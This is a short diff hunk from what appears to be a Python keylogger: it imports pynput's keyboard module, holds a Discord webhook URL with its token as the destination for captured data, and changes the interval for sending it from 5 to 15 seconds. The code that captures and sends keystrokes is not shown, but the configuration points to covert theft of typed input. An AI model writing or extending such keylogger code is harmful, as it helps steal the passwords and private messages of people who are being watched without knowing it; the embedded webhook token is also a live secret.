@@ -6,7 +6,7 @@ from pynput import keyboard
 
 # === CONFIG ===
 WEBHOOK = "https://discord.com/api/webhooks/1396489430990196866/m0ocO7FF7aqQJc8sRCfJcPaFcQCXDmrrpFi3CTmAv76OqxaBf4o1oO3sKrbYCOO-eW0S"
-SEND_INTERVAL = 5  # seconds
+SEND_INTERVAL = 15  # seconds
 
 # === STATE ===
 shift_pressed = False
